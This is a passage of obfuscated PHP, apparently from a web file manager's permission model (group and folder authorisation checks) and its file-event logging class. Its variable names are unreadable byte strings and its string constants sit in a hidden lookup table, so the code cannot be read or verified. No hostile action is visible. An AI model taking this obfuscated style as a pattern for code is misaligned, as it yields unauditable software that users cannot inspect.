$ê§‹ŒæĞ[$¨é…½¬”]; } $¬©ñİÍ‚ = Model($Óı‹š¤Ï[2181])->listData(); $µÇ¥ÇÅÄ = array(); foreach ($¬©ñİÍ‚ as $©ÕÉ“Ûø) { if ($©ÕÉ“Ûø[$Óı‹š¤Ï[496]] == 0 && $©ÕÉ“Ûø[$Óı‹š¤Ï[2000]] == $Óı‹š¤Ï[101]) { $µÇ¥ÇÅÄ[] = $©ÕÉ“Ûø[$Óı‹š¤Ï[484]]; } } $Ì¯ãËşâ = $this->userGroupParents($¨é…½¬”); $»·‡Û²¹ = array($Óı‹š¤Ï[200] => SourceModel::TYPE_USER, $Óı‹š¤Ï[578] => $¨é…½¬”); if ($Ì¯ãËşâ) { $»·‡Û²¹ = array(array($Óı‹š¤Ï[200] => SourceModel::TYPE_USER, $Óı‹š¤Ï[578] => $¨é…½¬”), array($Óı‹š¤Ï[200] => SourceModel::TYPE_GROUP, $Óı‹š¤Ï[578] => array($Óı‹š¤Ï[501], $Ì¯ãËşâ)), $Óı‹š¤Ï[1089] => $Óı‹š¤Ï[2080]); } $şÎƒ½­˜ = $this->field($Óı‹š¤Ï[2182])->where($»·‡Û²¹)->select(); $·“éóŠ = array(); $Àª¦˜‹ = array_to_keyvalue_group($şÎƒ½­˜, $Óı‹š¤Ï[203]); foreach ($Àª¦˜‹ as $²Æ¤ÄÖ => $â·ûŞ‚) { $ªÜĞ­½À = $this->authArrayCheck($â·ûŞ‚, $¨é…½¬”); if ($ªÜĞ­½À[$Óı‹š¤Ï[497]] > 0) { $·“éóŠ[] = $²Æ¤ÄÖ . $Óı‹š¤Ï[12]; } } if ($Ì¯ãËşâ) { $ü•ÈÀß = Model($Óı‹š¤Ï[594]); foreach ($Ì¯ãËşâ as $¿ûÃÍÌ) { $¥½ ©™á = $ü•ÈÀß->getInfo($¿ûÃÍÌ); if (!$¥½ ©™á || !is_array($¥½ ©™á[$Óı‹š¤Ï[100]])) { continue; } $·“éóŠ[] = $¥½ ©™á[$Óı‹š¤Ï[100]][$Óı‹š¤Ï[203]]; } } $Î¯¢ø±Ø = array(); $×ò‰ÃÆ = $Ì¯ãËşâ; $»¯öÉÌ¼ = Model($Óı‹š¤Ï[1429]); $ü•ÈÀß = Model($Óı‹š¤Ï[594]); $¬§ùÜ ‘ = array(); $ ¢¯–Öæ = array(); $•¥®ëÌå = array(); $¢Ïà¡à¢ = array(); if ($·“éóŠ) { $Ä Òçô  = $»¯öÉÌ¼->where(array($Óı‹š¤Ï[203] => array($Óı‹š¤Ï[501], $·“éóŠ)))->select(); foreach ($Ä Òçô  as $‡‹µø¢) { $²åµ‰Ñ = $»¯öÉÌ¼->parentLevelArray($‡‹µø¢[$Óı‹š¤Ï[593]]); $Î¯¢ø±Ø = array_merge($Î¯¢ø±Ø, $²åµ‰Ñ); $×ò‰ÃÆ[] = $‡‹µø¢[$Óı‹š¤Ï[578]]; $¬§ùÜ ‘[$‡‹µø¢[$Óı‹š¤Ï[203]]] = $²åµ‰Ñ; $ ¢¯–Öæ[$‡‹µø¢[$Óı‹š¤Ï[203]]] = $‡‹µø¢[$Óı‹š¤Ï[578]]; } } $×ò‰ÃÆ = array_values(array_unique($×ò‰ÃÆ)); $àÀÃ— = $×ò‰ÃÆ; foreach ($àÀÃ— as $¿ûÃÍÌ) { $¥½ ©™á = $ü•ÈÀß->getInfo($¿ûÃÍÌ); $²åµ‰Ñ = $»¯öÉÌ¼->parentLevelArray($¥½ ©™á[$Óı‹š¤Ï[593]]); $×ò‰ÃÆ = array_merge($×ò‰ÃÆ, $²åµ‰Ñ); } $×ò‰ÃÆ = array_values(array_unique($×ò‰ÃÆ)); foreach ($×ò‰ÃÆ as $¿ûÃÍÌ) { $¥½ ©™á = $ü•ÈÀß->getInfo($¿ûÃÍÌ); $Î¯¢ø±Ø[] = $¥½ ©™á[$Óı‹š¤Ï[100]][$Óı‹š¤Ï[203]]; $•¥®ëÌå[$¿ûÃÍÌ] = $¥½ ©™á[$Óı‹š¤Ï[100]][$Óı‹š¤Ï[203]]; $¢Ïà¡à¢[$¿ûÃÍÌ] = $»¯öÉÌ¼->parentLevelArray($¥½ ©™á[$Óı‹š¤Ï[593]]); } foreach ($¬§ùÜ ‘ as $±ùìŞ¼Õ => $Àïıİã²) { $¿Ï×Èï¾ = $ ¢¯–Öæ[$±ùìŞ¼Õ]; if (!$¿Ï×Èï¾ || !$•¥®ëÌå[$¿Ï×Èï¾]) { continue; } $ù‘ˆ¹ÔÑ = array(); foreach ($¢Ïà¡à¢[$¿Ï×Èï¾] as $¿ûÃÍÌ) { $ù‘ˆ¹ÔÑ[] = $•¥®ëÌå[$¿ûÃÍÌ]; } $¬§ùÜ ‘[$±ùìŞ¼Õ] = array_merge($ù‘ˆ¹ÔÑ, $Àïıİã²); } $Î¯¢ø±Ø = array_values(array_unique($Î¯¢ø±Ø)); $ò÷öÌÎõ = array($Óı‹š¤Ï[2174] => $Î¯¢ø±Ø, $Óı‹š¤Ï[2175] => $¬§ùÜ ‘); $ê§‹ŒæĞ[$¨é…½¬”] = $ò÷öÌÎõ; return $ò÷öÌÎõ; } private function makeSourceAuth($Êï—‰®¹, $í§éîŠ, $®öîå„ = false) { $ê”õ€áí =& $_SERVER[÷ôÚîå]; $“¹ºØó˜ = $ê”õ€áí[101]; $¯°‰ªş = $Êï—‰®¹[$ê”õ€áí[578]]; $¡‰ìèªË = $Êï—‰®¹[$ê”õ€áí[200]] == SourceModel::TYPE_GROUP; $ÛÜ£Ÿä÷ = $¡‰ìèªË ? $this->groupRootAuth($¯°‰ªş, $®öîå„) : !1; if ($ÛÜ£Ÿä÷ && Model($ê”õ€áí[580])->authCheckAction($ÛÜ£Ÿä÷[$ê”õ€áí[496]], $ê”õ€áí[1999])) { return $this->groupAuthInfo($ÛÜ£Ÿä÷, $¯°‰ªş); } $©Åô„¸¶ = Model($ê”õ€áí[1429])->parentLevelArray($Êï—‰®¹[$ê”õ€áí[593]]); $©Åô„¸¶ = array_merge(array($Êï—‰®¹[$ê”õ€áí[203]]), array_reverse($©Åô„¸¶)); $ï©„ûÌ = !1; foreach ($©Åô„¸¶ as $ÇÖ»‰±–) { if (!isset($í§éîŠ[$ÇÖ»‰±–])) { continue; } $´ìçˆ¡Ê = $this->authMake($í§éîŠ[$ÇÖ»‰±–], $®öîå„); if ($´ìçˆ¡Ê[$ê”õ€áí[549]]) { $ï©„ûÌ = $´ìçˆ¡Ê; break; } } if (!$¡‰ìèªË) { return $ï©„ûÌ; } if (!$ï©„ûÌ && $ÛÜ£Ÿä÷) { $ï©„ûÌ = $this->groupAuthInfo($ÛÜ£Ÿä÷, $¯°‰ªş); } if (!$ï©„ûÌ) { $®©È™†¡ = Model($ê”õ€áí[594])->getInfo($¯°‰ªş); $ØîÉ´ØÓ = explode($ê”õ€áí[50], trim($®©È™†¡[$ê”õ€áí[593]], $ê”õ€áí[50])); $ØîÉ´ØÓ = array_reverse($ØîÉ´ØÓ); foreach ($ØîÉ´ØÓ as $ÖèÊú) { if ($ÖèÊú == $ê”õ€áí[238] || $ÖèÊú == $“¹ºØó˜) { continue; } $ã‰‚¿ » = $this->groupRootAuth($ÖèÊú, $®öîå„); if (!$ã‰‚¿ ») { continue; } $ï©„ûÌ = $this->groupAuthInfo($ã‰‚¿ », $ÖèÊú); break; } } if (!$ï©„ûÌ || $ï©„ûÌ[$ê”õ€áí[497]] <= 0) { $‰åÈååÂ = $this->authDeepCheck($Êï—‰®¹[$ê”õ€áí[203]], $®öîå„); if ($‰åÈååÂ) { $ï©„ûÌ = $‰åÈååÂ; } } return $ï©„ûÌ; } private function userIsRoot($ŸïÛ¯ëõ = false) { $øåøª€í =& $_SERVER[÷ôÚîå]; if (!$ŸïÛ¯ëõ && KodUser::isRoot()) { return !0; } $ÕğáÁ…Ï = Model($øåøª€í[607])->getInfo($ŸïÛ¯ëõ); $ÄìòĞŒ” = Model($øåøª€í[2183])->listData($ÕğáÁ…Ï[$øåøª€í[2184]]); if ($ÄìòĞŒ” && $ÄìòĞŒ”[$øåøª€í[584]][$øåøª€í[2185]] == 1) { return !0; } return !1; } private function sourceAuthInfo($÷İ“‚¡Ë) { $Øš¿ãñì =& $_SERVER[÷ôÚîå]; $ö—ËÈì¡ = Model($Øš¿ãñì[1429]); $üêÛ“¾’ = $ö—ËÈì¡->sourceInfo($÷İ“‚¡Ë); if (!$üêÛ“¾’) { return !1; } $ö—ËÈì¡->groupPathDisplay($üêÛ“¾’); $Š£©ØéÕ = array($üêÛ“¾’); $Š£©ØéÕ = $ö—ËÈì¡->_listAppendPath($Š£©ØéÕ); $üêÛ“¾’ = $Š£©ØéÕ[0]; $‹™ÃªŞ = $üêÛ“¾’[$Øš¿ãñì[591]]; if (isset($üêÛ“¾’[$Øš¿ãñì[599]])) { $ñ¼Â¨Ä = explode($Øš¿ãñì[8], trim($üêÛ“¾’[$Øš¿ãñì[591]], $Øš¿ãñì[8])); array_shift($ñ¼Â¨Ä); $‹™ÃªŞ = $üêÛ“¾’[$Øš¿ãñì[597]] . $Øš¿ãñì[2186] . implode($Øš¿ãñì[8], $ñ¼Â¨Ä); } return array($Øš¿ãñì[503] => $üêÛ“¾’[$Øš¿ãñì[32]], $Øš¿ãñì[97] => KodIO::make($üêÛ“¾’[$Øš¿ãñì[203]]), $Øš¿ãñì[2187] => $‹™ÃªŞ); } private function groupAuthInfo($”³×ˆÀì, $š•¼ÈÇÂ) { $º¿³®‰ò =& $_SERVER[÷ôÚîå]; $îøÉ‹Ã‰ = Model($º¿³®‰ò[594])->getInfo($š•¼ÈÇÂ); return array($º¿³®‰ò[2188] => intval($”³×ˆÀì[$º¿³®‰ò[496]]), $º¿³®‰ò[2171] => $”³×ˆÀì, $º¿³®‰ò[2189] => LNG($º¿³®‰ò[2190]), $º¿³®‰ò[2180] => array($º¿³®‰ò[503] => $îøÉ‹Ã‰[$º¿³®‰ò[32]], $º¿³®‰ò[97] => KodIO::make($îøÉ‹Ã‰[$º¿³®‰ò[100]][$º¿³®‰ò[203]]), $º¿³®‰ò[2187] => $îøÉ‹Ã‰[$º¿³®‰ò[598]])); } protected function groupRootAuth($Ÿ¨®À§–, $¿ÂŸÓ¡¹ = false) { $¶ğ­Ï·² =& $_SERVER[÷ôÚîå]; $¿ÂŸÓ¡¹ = $¿ÂŸÓ¡¹ ? $¿ÂŸÓ¡¹ : USER_ID; $€Ëö„â = $¿ÂŸÓ¡¹ . $¶ğ­Ï·²[2191] . $Ÿ¨®À§–; static $ÉäŒ­—› = array(); if (isset($ÉäŒ­—›[$€Ëö„â])) { return $ÉäŒ­—›[$€Ëö„â]; } $³®¶Ÿ¼ğ = Model($¶ğ­Ï·²[594])->getInfo($Ÿ¨®À§–); $¦¯Ìƒ— = $this->userGroupList($¿ÂŸÓ¡¹); $¡ˆ§Äô× = isset($¦¯Ìƒ—[$Ÿ¨®À§–]) ? $¦¯Ìƒ—[$Ÿ¨®À§–][$¶ğ­Ï·²[496]] : !1; if ($¡ˆ§Äô× && Model($¶ğ­Ï·²[580])->authCheckAction($¡ˆ§Äô×[$¶ğ­Ï·²[496]], $¶ğ­Ï·²[1999])) { $ÉäŒ­—›[$€Ëö„â] = $¡ˆ§Äô×; return $¡ˆ§Äô×; } $Ø¹¬šÉ§ = $this->sourceAuthSelect($³®¶Ÿ¼ğ[$¶ğ­Ï·²[100]][$¶ğ­Ï·²[203]]); $©÷‘Óˆ÷ = $Ø¹¬šÉ§ ? $this->authMake($Ø¹¬šÉ§, $¿ÂŸÓ¡¹) : !1; $®Ú¹÷×í = $©÷‘Óˆ÷ ? $©÷‘Óˆ÷[$¶ğ­Ï·²[549]] : !1; $ÉäŒ­—›[$€Ëö„â] = $®Ú¹÷×í ? $®Ú¹÷×í : $¡ˆ§Äô×; return $ÉäŒ­—›[$€Ëö„â]; } public function authOwnerApply($¶¹Ó…½Ü) { $Š”ÉşêÔ =& $_SERVER[÷ôÚîå]; if (empty($¶¹Ó…½Ü[$Š”ÉşêÔ[496]]) || isset($¶¹Ó…½Ü[$Š”ÉşêÔ[2192]]) && $¶¹Ó…½Ü[$Š”ÉşêÔ[2192]]) { return $¶¹Ó…½Ü; } if (AuthModel::authCheckRoot($¶¹Ó…½Ü[$Š”ÉşêÔ[496]][$Š”ÉşêÔ[497]])) { return $¶¹Ó…½Ü; } $õïœè÷Ç = Model($Š”ÉşêÔ[1429])->parentLevelArray($¶¹Ó…½Ü[$Š”ÉşêÔ[593]]); $õïœè÷Ç = array_merge(array($¶¹Ó…½Ü[$Š”ÉşêÔ[203]]), array_reverse($õïœè÷Ç)); $ôÃ£¶½å = $this->sourceAuthSelect($õïœè÷Ç); $úí²–‘İ = array(); $ÎéÚ°ƒ¯ = array(); foreach ($ôÃ£¶½å as $¦ÑÉ¹ÔÖ => $õ‡öÀÅ) { $™Îœø£À = $this->authFolderOwnerUser($õ‡öÀÅ); $úí²–‘İ[$¦ÑÉ¹ÔÖ] = $™Îœø£À; $ÎéÚ°ƒ¯ = array_merge($ÎéÚ°ƒ¯, $™Îœø£À[$Š”ÉşêÔ[671]]); if ($™Îœø£À[$Š”ÉşêÔ[2193]]) { break; } } if (count($ÎéÚ°ƒ¯) == 0) { $ÎéÚ°ƒ¯ = $this->authFolderOwnerGroup($¶¹Ó…½Ü[$Š”ÉşêÔ[578]]); } $ÎéÚ°ƒ¯ = array_unique($ÎéÚ°ƒ¯); if (AuthModel::authCheckRoot($¶¹Ó…½Ü[$Š”ÉşêÔ[496]][$Š”ÉşêÔ[497]])) { $ÎéÚ°ƒ¯[] = USER_ID; } $¶¹Ó…½Ü[$Š”ÉşêÔ[496]][$Š”ÉşêÔ[2194]] = Model($Š”ÉşêÔ[586])->userListInfo($ÎéÚ°ƒ¯); return $¶¹Ó…½Ü; } private function authFolderOwnerGroup($Á¦õÛòÀ) { $Œ¤˜ƒ¡Ï =& $_SERVER[÷ôÚîå]; $şàƒÔı = Model($Œ¤˜ƒ¡Ï[2072])->where(array($Œ¤˜ƒ¡Ï[1978] => $Á¦õÛòÀ))->select(); $ËÁ„ÒÇÔ = array(); if (!$şàƒÔı) { return $ËÁ„ÒÇÔ; } foreach ($şàƒÔı as $Ú¸ÅıÑ‚) { $ûşŞ¢à“ = $this->authInfo($Ú¸ÅıÑ‚); if (AuthModel::authCheckRoot($ûşŞ¢à“[$Œ¤˜ƒ¡Ï[496]])) { $ËÁ„ÒÇÔ[] = $Ú¸ÅıÑ‚[$Œ¤˜ƒ¡Ï[1779]]; } } return $ËÁ„ÒÇÔ; } private function authFolderOwnerUser($ƒÖ»Îà) { $Õ£«ÕŞ’ =& $_SERVER[÷ôÚîå]; $ûÍó = array(); $ÑˆçË‚Ú = !1; foreach ($ƒÖ»Îà as $Õû‘„úû) { $·Ì›îãö = $this->authInfo($Õû‘„úû); if ($Õû‘„úû[$Õ£«ÕŞ’[578]] == $Õ£«ÕŞ’[238]) { $ÑˆçË‚Ú = !0; } if ($Õû‘„úû[$Õ£«ÕŞ’[200]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($·Ì›îãö[$Õ£«ÕŞ’[496]])) { $ûÍó[] = $Õû‘„úû[$Õ£«ÕŞ’[578]]; } } } return array($Õ£«ÕŞ’[671] => $ûÍó, $Õ£«ÕŞ’[2193] => $ÑˆçË‚Ú); } public function authMake($´…äé», $¥×²Ü• = false) { $ïÅ¿Ò«‰ =& $_SERVER[÷ôÚîå]; $†ˆÓ”°µ = $this->authArrayCheck($´…äé», $¥×²Ü•); if ($†ˆÓ”°µ[$ïÅ¿Ò«‰[2195]]) { $†ˆÓ”°µ[$ïÅ¿Ò«‰[2195]] = $this->sourceAuthInfo($†ˆÓ”°µ[$ïÅ¿Ò«‰[2195]]); } return $†ˆÓ”°µ; } public function authArrayCheck($ç“·æ·Ì, $ŒôÁ¢Ñ™ = false) { $“¨Ş¨­º =& $_SERVER[÷ôÚîå]; if (!$ç“·æ·Ì) { return array($“¨Ş¨­º[497] => 0, $“¨Ş¨­º[549] => !1); } $ŒôÁ¢Ñ™ = $ŒôÁ¢Ñ™ ? $ŒôÁ¢Ñ™ : USER_ID; $µå©ÂÛ¡ = 0; $›©ÖåËÎ = 0; $éğğ¶²Ã = 0; $†¶ËìÖõ = 0; $‚îÌå = 0; $»àÊèª = 0; $Â€à¬«Ç = 1000; $¶³¡ÙÃ† = 0; $ñõœ¯š = 0; $ñˆÎ›û = 0; $è¨’ôËÉ = 0; $¨­¶¬ = array($“¨Ş¨­º[203] => 0); foreach ($ç“·æ·Ì as $¨­¶¬) { $ù±ĞÍª‹ = $this->authInfo($¨­¶¬); if (!$ù±ĞÍª‹) { continue; } $½­»ö²› = $¨­¶¬[$“¨Ş¨­º[578]]; $âè¾ÙÍ· = intval($ù±ĞÍª‹[$“¨Ş¨­º[496]]); if ($¨­¶¬[$“¨Ş¨­º[200]] == SourceModel::TYPE_USER && $½­»ö²› == $ŒôÁ¢Ñ™) { $µå©ÂÛ¡ = !0; $éğğ¶²Ã = $ù±ĞÍª‹; $›©ÖåËÎ = $âè¾ÙÍ·; } else { if ($¨­¶¬[$“¨Ş¨­º[200]] == SourceModel::TYPE_GROUP && $this->groupContainUser($½­»ö²›, $ŒôÁ¢Ñ™)) { $†¶ËìÖõ = !0; $³‹†¦ö‰ = $this->groupStepToUserGroup($½­»ö²›, $ŒôÁ¢Ñ™); if ($³‹†¦ö‰ < $Â€à¬«Ç) { $Â€à¬«Ç = $³‹†¦ö‰; $‚îÌå = $âè¾ÙÍ·; $»àÊèª = $ù±ĞÍª‹; $¶³¡ÙÃ† = $½­»ö²›; } if ($³‹†¦ö‰ == $Â€à¬«Ç && $âè¾ÙÍ· >= $‚îÌå) { $‚îÌå = $âè¾ÙÍ·; $»àÊèª = $ù±ĞÍª‹; $¶³¡ÙÃ† = $½­»ö²›; } } else { if ($½­»ö²› == $“¨Ş¨­º[238]) { $ñõœ¯š = !0; $è¨’ôËÉ = $ù±ĞÍª‹; $ñˆÎ›û = $âè¾ÙÍ·; } } } } if ($µå©ÂÛ¡) { $µ·˜Ÿ”§ = $›©ÖåËÎ; $ù±ĞÍª‹ = $éğğ¶²Ã; $’³ù¾É = LNG($“¨Ş¨­º[2196]); } else { if ($†¶ËìÖõ) { $µ·˜Ÿ”§ = $‚îÌå; $ù±ĞÍª‹ = $»àÊèª; $¦Ì‰ò‚Ã = Model($“¨Ş¨­º[594])->getInfo($¶³¡ÙÃ†); $’³ù¾É = $“¨Ş¨­º[186] . $¦Ì‰ò‚Ã[$“¨Ş¨­º[598]] . $“¨Ş¨­º[2197] . LNG($“¨Ş¨­º[2198]); } else { if ($ñõœ¯š) { $µ·˜Ÿ”§ = $ñˆÎ›û; $ù±ĞÍª‹ = $è¨’ôËÉ; $’³ù¾É = LNG($“¨Ş¨­º[2168]); } else { $µ·˜Ÿ”§ = 0; $ù±ĞÍª‹ = !1; $’³ù¾É = $“¨Ş¨­º[12]; } } } $ÈÄìËĞ€ = array($“¨Ş¨­º[2188] => intval($µ·˜Ÿ”§), $“¨Ş¨­º[2171] => $ù±ĞÍª‹, $“¨Ş¨­º[2189] => $’³ù¾É, $“¨Ş¨­º[2180] => $¨­¶¬[$“¨Ş¨­º[203]]); return $ÈÄìËĞ€; } private function groupContainUser($°Ó‚œùÕ, $•ü¯º = false) { return in_array($°Ó‚œùÕ, $this->userGroupParents($•ü¯º)); } private function groupStepToUserGroup($ÛøÕÔ´“, $Î÷Ã“‡» = false) { $¾ËåÁ¨± =& $_SERVER[÷ôÚîå]; $¿¾À¨Şº = $this->userGroupList($Î÷Ã“‡»); $óæ¬ø…É = 1000; $Ú²ÍÍË = $GLOBALS[$¾ËåÁ¨±[6]][$¾ËåÁ¨±[102]][$¾ËåÁ¨±[2085]] == 1; $Òæò¿ ğ = $Ú²ÍÍË ? 3 : 2; foreach ($¿¾À¨Şº as $¯•øÍÁ¬) { if ($¯•øÍÁ¬[$¾ËåÁ¨±[1978]] == $ÛøÕÔ´“) { return 0; } $¿Ø¿„ñ = explode($¾ËåÁ¨±[50], trim($¯•øÍÁ¬[$¾ËåÁ¨±[593]], $¾ËåÁ¨±[50])); if ($¿Ø¿„ñ[0] == $¾ËåÁ¨±[238] && count($¿Ø¿„ñ) > $Òæò¿ ğ) { $ĞôËö = array_reverse(array_slice($¿Ø¿„ñ, $Òæò¿ ğ)); $‚Å§ÃÜ± = array_search($ÛøÕÔ´“, $ĞôËö); if ($‚Å§ÃÜ± !== !1 && $‚Å§ÃÜ± + 1 <= $óæ¬ø…É) { $óæ¬ø…É = $‚Å§ÃÜ± + 1; } } } return $óæ¬ø…É; } private function userGroupList($©¯ı» = false) { $ÍĞ­Á£ù =& $_SERVER[÷ôÚîå]; static $¯¥µ„ÒŞ = array(); if (isset($¯¥µ„ÒŞ[$©¯ı»])) { return $¯¥µ„ÒŞ[$©¯ı»]; } $ì˜ÎÆ‹ª = Model($ÍĞ­Á£ù[607])->getInfo($©¯ı»); $¯¥µ„ÒŞ[$©¯ı»] = array_to_keyvalue($ì˜ÎÆ‹ª[$ÍĞ­Á£ù[2169]], $ÍĞ­Á£ù[1978]); return $¯¥µ„ÒŞ[$©¯ı»]; } public function userGroupParents($¼ƒ›ŠÓˆ) { $Õ¾³Ä =& $_SERVER[÷ôÚîå]; static $¹Û²÷®¼ = array(); $¼ƒ›ŠÓˆ = $¼ƒ›ŠÓˆ ? $¼ƒ›ŠÓˆ : USER_ID; if (isset($¹Û²÷®¼[$¼ƒ›ŠÓˆ])) { return $¹Û²÷®¼[$¼ƒ›ŠÓˆ]; } $¥˜ûğŸ¢ = $this->userGroupList($¼ƒ›ŠÓˆ); $Ş€ÑŸ»í = array(); $•¬ùêŸİ = $GLOBALS[$Õ¾³Ä[6]][$Õ¾³Ä[102]][$Õ¾³Ä[2085]] == 1; $ìİ³ „ = $•¬ùêŸİ ? 3 : 2; foreach ($¥˜ûğŸ¢ as $¡ó½úÕ…) { $œÜ¡ÄÜË = array($¡ó½úÕ…[$Õ¾³Ä[1978]]); $÷½’û›Ô = explode($Õ¾³Ä[50], trim($¡ó½úÕ…[$Õ¾³Ä[593]], $Õ¾³Ä[50])); if ($÷½’û›Ô[0] == $Õ¾³Ä[238] && count($÷½’û›Ô) > $ìİ³ „) { $¬©€ËïÓ = array_slice($÷½’û›Ô, $ìİ³ „); $œÜ¡ÄÜË = array_merge($œÜ¡ÄÜË, array_reverse($¬©€ËïÓ)); } $Ş€ÑŸ»í = array_merge($Ş€ÑŸ»í, $œÜ¡ÄÜË); } $¹Û²÷®¼[$¼ƒ›ŠÓˆ] = array_unique($Ş€ÑŸ»í); return $¹Û²÷®¼[$¼ƒ›ŠÓˆ]; } public function authTargetInfoMake($ì—´•Ş©) { $ğî—¸²É =& $_SERVER[÷ôÚîå]; $¬‡”†“ = array(); $üôíîãé = array(); foreach ($ì—´•Ş© as $ëÜ¢¡Ã©) { if ($ëÜ¢¡Ã©[$ğî—¸²É[200]] == SourceModel::TYPE_USER) { $¬‡”†“[] = intval($ëÜ¢¡Ã©[$ğî—¸²É[578]]); } else { if ($ëÜ¢¡Ã©[$ğî—¸²É[200]] == SourceModel::TYPE_GROUP) { $üôíîãé[] = intval($ëÜ¢¡Ã©[$ğî—¸²É[578]]); } } } if ($¬‡”†“) { $¬‡”†“ = Model($ğî—¸²É[586])->userListInfo($¬‡”†“); } if ($üôíîãé) { $”åÊ¬æ¿ = array($ğî—¸²É[2070] => array($ğî—¸²É[501], $üôíîãé)); $üôíîãé = Model($ğî—¸²É[594])->field($ğî—¸²É[2199])->where($”åÊ¬æ¿)->select(); $üôíîãé = array_to_keyvalue($üôíîãé, $ğî—¸²É[1978]); } return array($ğî—¸²É[2200] => $¬‡”†“, $ğî—¸²É[2201] => $üôíîãé); } public function authInfo($‚öº—Ì») { $şÒÄ½Şœ =& $_SERVER[÷ôÚîå]; if ($‚öº—Ì»[$şÒÄ½Şœ[2086]]) { $Ì¨ø˜Œø = Model($şÒÄ½Şœ[580])->listData($‚öº—Ì»[$şÒÄ½Şœ[2086]]); if (!$Ì¨ø˜Œø) { return !1; $µÑ¼÷¼ƒ = Model($şÒÄ½Şœ[580])->listData(); $Ş¶°à¬ä = array_filter_by_field($µÑ¼÷¼ƒ, $şÒÄ½Şœ[496], $şÒÄ½Şœ[238]); return $Ş¶°à¬ä; } $¤ÄÏ‰Üõ = array_field_key($Ì¨ø˜Œø, array($şÒÄ½Şœ[484], $şÒÄ½Şœ[32], $şÒÄ½Şœ[496], $şÒÄ½Şœ[2001], $şÒÄ½Şœ[2002])); $¤ÄÏ‰Üõ[$şÒÄ½Şœ[2202]] = $‚öº—Ì»; return $¤ÄÏ‰Üõ; } else { return array($şÒÄ½Şœ[502] => 0, $şÒÄ½Şœ[1984] => $‚öº—Ì»[$şÒÄ½Şœ[2146]], $şÒÄ½Şœ[503] => $şÒÄ½Şœ[12], $şÒÄ½Şœ[2001] => $şÒÄ½Şœ[2203]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\x72\143\145\137\x65\x76\145\156\x74"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\124\151\x6d\145", "\x74\151\155\145", "\151\x6e\x73\x65\162\x74", "\x66\x75\156\143\x74\151\x6f\x6e"), array("\144\x65\163\x63", '', "\x69\x6e\163\x65\x72\x74\x2c\165\x70\144\x61\x74\145\x2c\x73\145\x6c\145\143\164", "\152\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($È£ı¢§õ, $†…¤¹ÜÃ, $µİ×Üê = '') { $áˆ”òİå =& $_SERVER[÷ôÚîå]; if (!$this->eventSave) { return; } $÷ÓÉÏô€ = Model($áˆ”òİå[1429])->sourceInfo($È£ı¢§õ); if (!$÷ÓÉÏô€) { return !1; } if ($this->isDisableEvent($÷ÓÉÏô€, $†…¤¹ÜÃ)) { return; } if ($µİ×Üê && is_string($µİ×Üê)) { $µİ×Üê = array($áˆ”òİå[2017] => $µİ×Üê); } $ˆ•Âê = defined($áˆ”òİå[2204]) ? USER_ID : 0; $–Ùšò’§ = array($áˆ”òİå[500] => $È£ı¢§õ, $áˆ”òİå[2205] => $÷ÓÉÏô€[$áˆ”òİå[202]], $áˆ”òİå[2206] => $÷ÓÉÏô€[$áˆ”òİå[32]], $áˆ”òİå[591] => !empty($÷ÓÉÏô€[$áˆ”òİå[591]]) ? $÷ÓÉÏô€[$áˆ”òİå[591]] : $áˆ”òİå[12], $áˆ”òİå[1770] => $ˆ•Âê, $áˆ”òİå[505] => $†…¤¹ÜÃ, $áˆ”òİå[1772] => $µİ×Üê); $this->addSystemLog($†…¤¹ÜÃ, $–Ùšò’§); unset($–Ùšò’§[$áˆ”òİå[2206]], $–Ùšò’§[$áˆ”òİå[591]]); return $this->add($–Ùšò’§); } private function addSystemLog($â”Æ«±£, $Ï³Ä´Á°) { $¥‹òÀ›œ =& $_SERVER[÷ôÚîå]; if ($â”Æ«±£ == $¥‹òÀ›œ[2207]) { $â”Æ«±£ = $Ï³Ä´Á°[$¥‹òÀ›œ[535]][$¥‹òÀ›œ[2208]]; } else { if (in_array($â”Æ«±£, array($¥‹òÀ›œ[1957], $¥‹òÀ›œ[2209]))) { $â”Æ«±£ = $Ï³Ä´Á°[$¥‹òÀ›œ[535]][$¥‹òÀ›œ[181]]; } } $Ó¬ª³Ã = array_merge($Ï³Ä´Á°, array($¥‹òÀ›œ[2210] => $Ï³Ä´Á°[$¥‹òÀ›œ[203]], $¥‹òÀ›œ[2211] => $Ï³Ä´Á°[$¥‹òÀ›œ[2211]])); Hook::trigger($¥‹òÀ›œ[2212], $¥‹òÀ›œ[2213] . $â”Æ«±£, $Ï³Ä´Á°); Model($¥‹òÀ›œ[1921])->addLog($¥‹òÀ›œ[2213] . $â”Æ«±£, $Ó¬ª³Ã); } private function isDisableEvent($ùğ‰Ù¼«, $È¨ÏÁ©–) { $Ä«ä´ù =& $_SERVER[÷ôÚîå]; if ($ùğ‰Ù¼«[$Ä«ä´ù[200]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($È¨ÏÁ©– == $Ä«ä´ù[1946]) { return !1; } return !0; } public function eventCreate($—æĞ°¡¢, $ñµôÚ¢û) { $‡ıœ“Æï =& $_SERVER[÷ôÚîå]; $µ¸‹ò´Î = Model($‡ıœ“Æï[1429])->sourceInfo($—æĞ°¡¢); $ø¨Ç£ÈÇ = array($‡ıœ“Æï[2208] => $ñµôÚ¢û, $‡ıœ“Æï[32] => $µ¸‹ò´Î[$‡ıœ“Æï[32]]); return $this->addEvent($—æĞ°¡¢, $‡ıœ“Æï[2207], $ø¨Ç£ÈÇ); } public function eventFileEdit($¡Û–›™) { $³¾ó¶Êá =& $_SERVER[÷ôÚîå]; $í”ÁíÃº = array($³¾ó¶Êá[2214] => $_SERVER[$³¾ó¶Êá[2215]], $³¾ó¶Êá[2216] => strtolower(ACTION)); if (isset($GLOBALS[$³¾ó¶Êá[7]][$³¾ó¶Êá[2217]])) { $í”ÁíÃº[$³¾ó¶Êá[2217]] = $³¾ó¶Êá[101]; } return $this->addEvent($¡Û–›™, $³¾ó¶Êá[1947], $í”ÁíÃº); } public function eventRecycle($›»Ç’À§, $Š—€¬Äİ) { return $this->addEvent($›»Ç’À§, $_SERVER[÷ôÚîå][2209], $Š—€¬Äİ); } private static $_removeLast = ''; public function eventRemove($Îò¬…²Â) { $—ªô—şŸ =& $_SERVER[÷ôÚîå]; self::$_removeLast = $Îò¬…²Â; $ƒ’†«”É = Model($—ªô—şŸ[1429])->sourceInfo($Îò¬…²Â); $ĞÉñ˜ºŒ = 